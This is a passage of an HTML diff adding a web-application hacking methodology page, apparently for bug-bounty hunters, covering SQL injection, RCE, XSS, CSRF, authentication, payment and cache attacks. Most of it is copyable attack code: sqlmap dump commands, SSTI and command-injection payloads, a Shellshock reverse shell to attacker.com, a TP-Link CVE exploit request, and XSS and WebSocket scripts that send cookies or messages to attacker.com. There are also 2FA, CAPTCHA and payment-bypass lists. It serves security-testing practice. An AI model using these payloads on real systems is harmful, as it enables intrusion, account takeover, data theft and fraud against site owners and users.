+# Decompile with ILSpy or dnSpy
+ilspycmd App.dll -o ./decompiled/</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 12 ==================== -->
+    <section class="methodology-section" id="sec-12">
+      <div class="section-header">
+        <span class="section-num">12</span>
+        <span class="section-title">SQL Injection</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">Basic SQLi Payloads</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">sql</span><button class="copy-btn"></button></div><pre><code>'
+''
+`
+``
+,
+"
+""
+/
+//
+\
+\\
+;
+' or "
+-- or #
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+'='
+'LIKE'
+'=0--+
+OR 1=1
+' OR 'x'='x
+' AND id IS NULL; --
+'''''''''''''UNION SELECT '2</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Login Bypass Payloads</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">sql</span><button class="copy-btn"></button></div><pre><code>admin'--
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
+admin') --
+' UNION SELECT 1,username,password FROM users--
+' OR 1=1 LIMIT 1 --
+' OR 'x'='x'; --</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Time-Based Blind SQLi</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">sql</span><button class="copy-btn"></button></div><pre><code># MySQL
+' AND SLEEP(5)--
+1' AND SLEEP(5)--
+" AND SLEEP(5)--
+') AND SLEEP(5)--
+
+# MSSQL
+'; WAITFOR DELAY '0:0:5'--
+1; WAITFOR DELAY '0:0:5'--
+
+# PostgreSQL
+'; SELECT pg_sleep(5)--
+1; SELECT pg_sleep(5)--
+
+# Oracle
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Header Injection</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># All headers to test for SQLi
+User-Agent: ' OR SLEEP(5)--
+Referer: ' OR SLEEP(5)--
+X-Forwarded-For: ' OR SLEEP(5)--
+X-Forwarded-Host: ' OR SLEEP(5)--
+X-Client-IP: ' OR SLEEP(5)--
+X-Remote-IP: ' OR SLEEP(5)--
+X-Remote-Addr: ' OR SLEEP(5)--
+X-Originating-IP: ' OR SLEEP(5)--
+Cookie: session=' OR SLEEP(5)--</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">JSON Injection</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">json</span><button class="copy-btn"></button></div><pre><code>{"username": "admin'--", "password": "pass"}
+{"id": "1 OR 1=1--"}
+{"search": "' UNION SELECT null,username,password FROM users--"}
+{"filter": {"$where": "this.password == this.username"}}</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">SQLMap Commands</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Basic usage
+sqlmap -u "https://example.com/page?id=1" --dbs
+
+# POST request
+sqlmap -u "https://example.com/login" --data="user=admin&pass=test" --dbs
+
+# From Burp request file
+sqlmap -r request.txt --dbs --level 5 --risk 3
+
+# Dump specific database
+sqlmap -u "https://example.com/?id=1" -D dbname --tables
+sqlmap -u "https://example.com/?id=1" -D dbname -T users --dump
+
+# WAF bypass
+sqlmap -u "https://example.com/?id=1" --tamper=space2comment,charencode --dbs
+
+# Crawl and scan
+sqlmap -u "https://example.com/" --crawl=3 --dbs
+
+# Cookie injection
+sqlmap -u "https://example.com/" --cookie="session=abc123" -p session --dbs</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">WAF Bypass Techniques</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">sql</span><button class="copy-btn"></button></div><pre><code>-- Comment bypass
+/**/SELECT/**/username/**/FROM/**/users
+SE/**/LECT username FROM users
+
+-- Case variation
+SeLeCt UsErNaMe FrOm UsErS
+
+-- URL encoding
+%27%20OR%20%271%27=%271
+
+-- Double encoding
+%2527 (double-encoded ')
+
+-- Hex encoding
+0x61646d696e (admin in hex)
+
+-- Whitespace alternatives
+SELECT%09username%09FROM%09users
+SELECT%0ausername%0afrom%0ausers
+
+-- Scientific notation
+1e0 UNION SELECT...</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 13 ==================== -->
+    <section class="methodology-section" id="sec-13">
+      <div class="section-header">
+        <span class="section-num">13</span>
+        <span class="section-title">RCE (Remote Code Execution)</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">Command Injection</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>; whoami
+| whoami
+`whoami`
+$(whoami)
+; ls -la
+&& id
+|| id
+%0a id
+%0d%0a id
+{whoami}
+$IFS$9whoami</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">SSTI (Server-Side Template Injection)</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Detection
+{{7*7}}
+${7*7}
+&lt;%= 7*7 %&gt;
+#{7*7}
+*{7*7}
+@(7+7)
+{{'a'.toUpperCase()}}
+
+# Jinja2 (Python/Flask)
+{{config}}
+{{config.items()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+
+# Twig (PHP)
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("id")}}
+
+# Freemarker (Java)
+&lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")}
+
+# Velocity (Java)
+#set($str=$class.inspect("java.lang.Runtime").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$str.getRuntime().exec("id"))
+$ex.waitFor()
+
+# ERB (Ruby)
+&lt;%= `id` %&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Shellshock</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>curl -H "User-Agent: () { :;}; echo; /bin/bash -c 'id'" https://example.com/cgi-bin/test.cgi
+curl -H "Referer: () { :;}; /bin/bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1" https://example.com/cgi-bin/</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">CVE-2023-1389 (TP-Link RCE)</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code>curl -s -X POST "http://TARGET_IP/cgi-bin/luci/;stok=/locale" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data "form=country&operation=write&country=$(id)"</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">File Inclusion (LFI/RFI)</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># LFI payloads
+?page=../../../../etc/passwd
+?page=....//....//....//etc/passwd
+?page=%2e%2e%2f%2e%2e%2fetc/passwd
+?page=..%252f..%252fetc/passwd
+?page=php://filter/convert.base64-encode/resource=index.php
+?page=php://input  (with POST: &lt;?php system('id'); ?&gt;)
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+
+# Log poisoning via LFI
+?page=/var/log/apache2/access.log  (after injecting PHP in User-Agent)
+
+# RFI
+?page=http://attacker.com/shell.txt
+?page=\\attacker.com\share\shell.php</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 14 ==================== -->
+    <section class="methodology-section" id="sec-14">
+      <div class="section-header">
+        <span class="section-num">14</span>
+        <span class="section-title">XSS (Cross-Site Scripting)</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">Basic XSS Payloads</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+"&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+'&gt;&lt;script&gt;alert(1)&lt;/script&gt;
+javascript:alert(1)
+&lt;details open ontoggle=alert(1)&gt;
+&lt;video&gt;&lt;source onerror=alert(1)&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Swagger-UI DOM XSS</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">url</span><button class="copy-btn"></button></div><pre><code>https://example.com/swagger/?url=https://attacker.com/evil.json
+https://example.com/swagger-ui.html?url=javascript:alert(1)
+https://example.com/api-docs/?configUrl=https://attacker.com/xss.json</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Blind XSS Locations &amp; Payloads</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code># XSS Hunter payload
+&lt;script src=https://your.xss.ht&gt;&lt;/script&gt;
+"&gt;&lt;script src=https://your.xss.ht&gt;&lt;/script&gt;
+'&gt;&lt;script src=https://your.xss.ht&gt;&lt;/script&gt;
+
+# Test locations:
+# - Contact forms
+# - Feedback forms  
+# - User-Agent header
+# - Referer header
+# - Support ticket systems
+# - User registration (name, bio)
+# - File upload filenames
+# - Order/shipping address fields</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">WAF Bypass Payloads (Cloudflare &amp; Others)</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code>&lt;!--&lt;img src="--&gt;&lt;img src=x onerror=alert(1)//&gt;
+&lt;object data="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
+&lt;iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"&gt;
+&lt;svg&gt;&lt;animate onbegin=alert(1) attributeName=x&gt;
+&lt;a href="&#106;avascript:alert(1)"&gt;Click&lt;/a&gt;
+&lt;img src=x:alert(alt) onerror=eval(src) alt=1&gt;
+&lt;script&gt;window['ale'+'rt'](1)&lt;/script&gt;
+&lt;img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)"&gt;
+&lt;svg/onload=&#97;&#108;&#101;&#114;&#116;(1)&gt;
+&lt;ScRipT&gt;alert(1)&lt;/sCriPt&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Content-Encoding Bypass</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code># UTF-7
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+
+# UTF-16
+&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+
+# Base64 in data URI
+&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">CSP Bypass Techniques</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code># JSONP bypass
+&lt;script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"&gt;&lt;/script&gt;
+
+# Angular sandbox escape (older versions)
+{{constructor.constructor('alert(1)')()}}
+
+# CDN bypass - load from allowed CDN
+&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"&gt;&lt;/script&gt;
+&lt;div ng-app ng-csp&gt;{{$eval.constructor('alert(1)')()}}&lt;/div&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Cookie Stealing / Account Takeover via XSS</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code>&lt;script&gt;
+  new Image().src='https://attacker.com/steal?c='+document.cookie;
+&lt;/script&gt;
+
+&lt;script&gt;
+  fetch('https://attacker.com/steal?c='+btoa(document.cookie));
+&lt;/script&gt;
+
+&lt;script&gt;
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', 'https://attacker.com/steal?c='+document.cookie);
+  xhr.send();
+&lt;/script&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Open Redirect to XSS</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">url</span><button class="copy-btn"></button></div><pre><code>https://example.com/redirect?url=javascript:alert(1)
+https://example.com/redirect?url=data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;
+https://example.com/out?url=%0d%0aLocation:javascript:alert(1)</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">XSL Injection</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">xml</span><button class="copy-btn"></button></div><pre><code>&lt;?xml version="1.0"?&gt;
+&lt;xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" version="1.0"&gt;
+  &lt;xsl:template match="/"&gt;
+    &lt;xsl:variable name="cmd"&gt;&lt;rt:exec rt:class="java.lang.Runtime"&gt;id&lt;/rt:exec&gt;&lt;/xsl:variable&gt;
+  &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 15 ==================== -->
+    <section class="methodology-section" id="sec-15">
+      <div class="section-header">
+        <span class="section-num">15</span>
+        <span class="section-title">WebSockets</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="subsection">
+          <div class="subsection-title">XSS via WebSocket</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code>&lt;img src=1 onerror='alert(1)'&gt;</code></pre></div>
+        </div>
+        <div class="subsection">
+          <div class="subsection-title">CSWSH PoC (Cross-Site WebSocket Hijacking)</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
+&lt;script&gt;
+  var ws = new WebSocket('wss://target.com/chat');
+  ws.onopen = function() {
+    ws.send('{"action":"getMessages"}');
+  };
+  ws.onmessage = function(event) {
+    fetch('https://attacker.com/steal?data='+btoa(event.data));
+  };
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div>
+        </div>
+        <div class="info-box warn"><span class="info-icon">⚠️</span><div>WebSocket connections don't enforce SOP by default. Test for missing Origin validation and CSRF tokens.</div></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 16 ==================== -->
+    <section class="methodology-section" id="sec-16">
+      <div class="section-header">
+        <span class="section-num">16</span>
+        <span class="section-title">Authentication Testing</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">Registration Attacks</div>
+          <ul>
+            <li>Register with existing email using different case: <code>Admin@example.com</code> vs <code>admin@example.com</code></li>
+            <li>Pre-account takeover: register victim's email before they do, then reset password</li>
+            <li>Email verification bypass: modify <code>verified=true</code> in response</li>
+            <li>0-auth bypass: link attacker's OAuth to victim's account</li>
+            <li>Register with <code>admin@example.com </code> (trailing space)</li>
+            <li>Unicode normalization: <code>аdmin@example.com</code> (Cyrillic 'a')</li>
+          </ul>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Login Attacks</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Default credentials to try
+admin:admin
+admin:password
+admin:admin123
+admin:123456
+root:root
+test:test
+guest:guest
+administrator:administrator
+
+# JSON array password attack
+{"username":"admin","password":["password","123456","admin","test"]}
+
+# Response manipulation: change "success":false to "success":true
+# Change HTTP 401 to 200
+# Remove error message conditions</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Password Reset Attacks</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">http</span><button class="copy-btn"></button></div><pre><code># Host header injection
+POST /password-reset HTTP/1.1
+Host: attacker.com
+# Or:
+Host: example.com
+X-Forwarded-Host: attacker.com
+X-Host: attacker.com
+
+# Email parameter pollution
+email=victim@example.com&amp;email=attacker@example.com
+email=victim@example.com,attacker@example.com
+email=victim@example.com%20attacker@example.com
+email=victim@example.com|attacker@example.com
+
+# Token leakage via Referer
+# Check if reset token appears in Referer header when clicking 3rd party links
+
+# UUID v1 sandwich attack
+# Request reset for known account before and after victim
+# UUIDv1 is time-based, predictable within window</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">2FA Bypass Techniques</div>
+          <ul>
+            <li>Response manipulation: change <code>"2fa_required":true</code> to <code>false</code></li>
+            <li>Skip 2FA step by directly navigating to post-login URL</li>
+            <li>Session confusion: use valid session from another account</li>
+            <li>Race condition: send multiple OTP verification requests simultaneously</li>
+            <li>Brute force backup codes (usually 8-digit numeric)</li>
+            <li>Cookie swap: swap authenticated cookie after passing 2FA on attacker's account</li>
+            <li>Reuse old OTP that hasn't expired</li>
+            <li>Use null/empty OTP: <code>{"otp": null}</code> or <code>{"otp": ""}</code></li>
+          </ul>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Broken Authentication - Session Management</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># Test Autorize Burp extension for access control
+# Privilege escalation via parameter manipulation
+GET /api/user/profile?id=1234 -&gt; Change to id=1235 (IDOR)
+
+# Cache poisoning for session fixation
+GET / HTTP/1.1
+X-Forwarded-Host: attacker.com
+# Check if host is reflected in Set-Cookie domain
+
+# Insecure session token prediction
+# Analyze entropy of session tokens</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 17 ==================== -->
+    <section class="methodology-section" id="sec-17">
+      <div class="section-header">
+        <span class="section-num">17</span>
+        <span class="section-title">Rate Limiting Bypass</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Endpoint variations
+/api/v1/reset  ->  /api/v1/Reset  ->  /api/v1//reset  ->  /api//v1/reset
+
+# Blank character injection in email
+admin@example.com  ->  admin+1@example.com  ->  admin%20@example.com
+
+# Header bypass (IP spoofing)
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 1.1.1.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+
+# IP rotation
+# Use Burp intruder with rotating proxy list
+
+# Add junk parameters to bypass caching
+?_=1, ?_=2, ?cache=1, ?v=1</code></pre></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 18 ==================== -->
+    <section class="methodology-section" id="sec-18">
+      <div class="section-header">
+        <span class="section-num">18</span>
+        <span class="section-title">Payment Bypass</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <ul>
+          <li>Change price parameter: <code>"price": 100</code> → <code>"price": 0</code> or <code>"price": -1</code></li>
+          <li>Negative quantity: <code>"quantity": -1</code></li>
+          <li>Currency manipulation: change USD to a weaker currency</li>
+          <li>Coupon stacking: apply the same coupon multiple times</li>
+          <li>Race condition on coupon/discount application</li>
+          <li>Skip payment step by directly navigating to order confirmation URL</li>
+          <li>Reuse a completed payment token from a previous transaction</li>
+          <li>Modify the total in the payment request body before submission</li>
+          <li>Free trial abuse: create multiple accounts for trial periods</li>
+          <li>Integer overflow: set quantity to max integer to wrap around to 0 or negative</li>
+        </ul>
+        <div class="info-box danger"><span class="info-icon">⚠️</span><div>Only test payment bypass on bug bounty programs that explicitly allow it. Never actually bypass real payments.</div></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 19 ==================== -->
+    <section class="methodology-section" id="sec-19">
+      <div class="section-header">
+        <span class="section-num">19</span>
+        <span class="section-title">CSRF (Cross-Site Request Forgery)</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+
+        <div class="subsection">
+          <div class="subsection-title">CSRF Token Bypass</div>
+          <ul>
+            <li>Remove the CSRF token entirely from request</li>
+            <li>Use a random value — if server doesn't validate</li>
+            <li>Use another user's valid CSRF token</li>
+            <li>Change POST to GET — server may skip CSRF check for GET</li>
+            <li>Change Content-Type to <code>text/plain</code> or <code>application/x-www-form-urlencoded</code></li>
+          </ul>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">CSRF PoC Template</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code>&lt;html&gt;
+&lt;body&gt;
+&lt;form action="https://example.com/change-email" method="POST"&gt;
+  &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+  &lt;input type="hidden" name="csrf" value="removed"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Clickjacking Chain</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code>&lt;style&gt;
+  iframe { opacity: 0.0001; position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
+  .decoy { position: absolute; top: 150px; left: 200px; z-index: 1; cursor: pointer; }
+&lt;/style&gt;
+&lt;div class="decoy"&gt;Click here to claim prize!&lt;/div&gt;
+&lt;iframe src="https://example.com/settings/delete-account"&gt;&lt;/iframe&gt;</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Referer Bypass</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code>&lt;!-- Add Referrer-Policy: no-referrer to suppress Referer header --&gt;
+&lt;meta name="referrer" content="no-referrer"&gt;
+&lt;form ...&gt;...&lt;/form&gt;</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 20 ==================== -->
+    <section class="methodology-section" id="sec-20">
+      <div class="section-header">
+        <span class="section-num">20</span>
+        <span class="section-title">HTML Injection</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">html</span><button class="copy-btn"></button></div><pre><code>&lt;h1&gt;Injected Heading&lt;/h1&gt;
+&lt;a href="https://evil.com"&gt;Click here to verify your account&lt;/a&gt;
+&lt;form action="https://evil.com"&gt;&lt;input type="password" name="password"&gt;&lt;input type="submit"&gt;&lt;/form&gt;
+&lt;meta http-equiv="refresh" content="0;url=https://evil.com"&gt;
+&lt;img src="https://evil.com/tracking.png"&gt;</code></pre></div>
+        <div class="info-box note"><span class="info-icon">📝</span><div>HTML injection without script execution can still be used for phishing, credential harvesting, and content spoofing attacks.</div></div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 21 ==================== -->
+    <section class="methodology-section" id="sec-21">
+      <div class="section-header">
+        <span class="section-num">21</span>
+        <span class="section-title">Captcha Bypass</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <ul>
+          <li>Remove CAPTCHA parameter from request body entirely</li>
+          <li>Reuse a previously solved CAPTCHA token</li>
+          <li>Set CAPTCHA value to <code>null</code>, empty string, or arbitrary value</li>
+          <li>Forward the request without the CAPTCHA field</li>
+          <li>Use AI-based solvers: 2captcha, Anti-Captcha, CapMonster</li>
+          <li>Check if CAPTCHA is validated server-side or only client-side</li>
+          <li>Audio CAPTCHA is often easier to solve programmatically</li>
+          <li>Test if CAPTCHA solution is tied to the user session</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 22 ==================== -->
+    <section class="methodology-section" id="sec-22">
+      <div class="section-header">
+        <span class="section-num">22</span>
+        <span class="section-title">Cache Poisoning</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="subsection">
+          <div class="subsection-title">Cache-Identifying Headers</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code>X-Cache: HIT / MISS
+CF-Cache-Status: HIT / MISS / BYPASS
+Age: (non-zero means cached)
+Cache-Control: max-age, s-maxage, public</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Param Miner Usage</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Burp Suite > Extensions > Param Miner
+# Right-click request > Guess headers/params
+# Look for unkeyed inputs that get reflected</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Reflected Header Poisoning</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">http</span><button class="copy-btn"></button></div><pre><code>GET / HTTP/1.1
+Host: example.com
+X-Forwarded-Host: attacker.com
+# If Host is used to generate URLs and response is cached,
+# victims loading cached page will have attacker.com URLs</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">When to Give Up</div>
+          <ul>
+            <li>Cache is not shared (per-user caching)</li>
+            <li>Target uses strong cache key including all headers</li>
+            <li>Response is never cached (Cache-Control: no-store)</li>
+            <li>CDN strips and ignores your injected headers</li>
+          </ul>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 23 ==================== -->
+    <section class="methodology-section" id="sec-23">
+      <div class="section-header">
+        <span class="section-num">23</span>
+        <span class="section-title">Cache Deception</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="subsection">
+          <div class="subsection-title">Path Confusion Techniques</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">url</span><button class="copy-btn"></button></div><pre><code># Add fake static extension
+https://example.com/account/profile.css
+https://example.com/account/settings.js
+https://example.com/account/info.jpeg
+https://example.com/api/user/me.png
+
+# Path traversal normalization
+https://example.com/account/..%2Fstatic%2F..%2Fprofile
+https://example.com/account/%2F..%2Fprofile.css
+
+# Delimiter tricks
+https://example.com/account/profile;.css
+https://example.com/account/profile?.css
+https://example.com/account/profile#.css</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Recollapse Tool</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">bash</span><button class="copy-btn"></button></div><pre><code># https://github.com/0xacb/recollapse
+recollapse -u https://example.com/account/profile -e .css,.js,.png</code></pre></div>
+        </div>
+
+        <div class="subsection">
+          <div class="subsection-title">Apache / Nginx / PHP Normalization</div>
+          <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">text</span><button class="copy-btn"></button></div><pre><code># Apache: /account/profile.php/nonexistent.css
+# Nginx: /account/profile/.css (if try_files used)
+# PHP: /account/profile.php/anything.css</code></pre></div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 24 ==================== -->
+    <section class="methodology-section" id="sec-24">
+      <div class="section-header">
+        <span class="section-num">24</span>
+        <span class="section-title">Business Logic Flaws</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <ul>
+          <li>Skip workflow steps (e.g., go from step 1 directly to step 3)</li>
+          <li>Negative values in quantity/price fields</li>
+          <li>Apply discount/coupon to already-discounted items</li>
+          <li>Transfer money to yourself (circular transfer)</li>
+          <li>Downgrade after using premium features</li>
+          <li>Invite more users than your plan allows via race condition</li>
+          <li>Exploit referral systems: refer yourself via multiple accounts</li>
+          <li>Modify response to change role: <code>"role":"user"</code> → <code>"role":"admin"</code></li>
+          <li>Access another user's order/invoice by changing order ID</li>
+          <li>Reuse a single-use token multiple times</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 25 ==================== -->
+    <section class="methodology-section" id="sec-25">
+      <div class="section-header">
+        <span class="section-num">25</span>
+        <span class="section-title">CRLF Injection</span>
+        <button class="section-complete-btn">Mark Done</button>
+        <span class="section-toggle">▼</span>
+      </div>
+      <div class="section-body">
+        <div class="code-block-wrapper"><div class="code-header"><span class="code-lang">url</span><button class="copy-btn"></button></div><pre><code>https://subDomain.microsoft.com/%0d%0aSet-Cookie:whoami=thecyberneh
